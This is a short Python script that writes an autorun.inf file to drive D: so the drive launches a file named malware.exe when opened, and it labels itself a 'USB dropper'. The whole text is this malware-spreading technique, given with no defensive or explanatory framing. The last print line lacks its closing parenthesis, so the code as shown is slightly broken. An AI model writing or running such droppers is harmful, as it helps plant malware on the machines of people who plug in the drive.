autorun_content = """
[AutoRun]
open=malware.exe
icon=icon.ico
"""

with open("D:\\autorun.inf", "w") as f:
    f.write(autorun_content)

print("[INFO] USB dropper created on 'D:\\autorun.inf'"
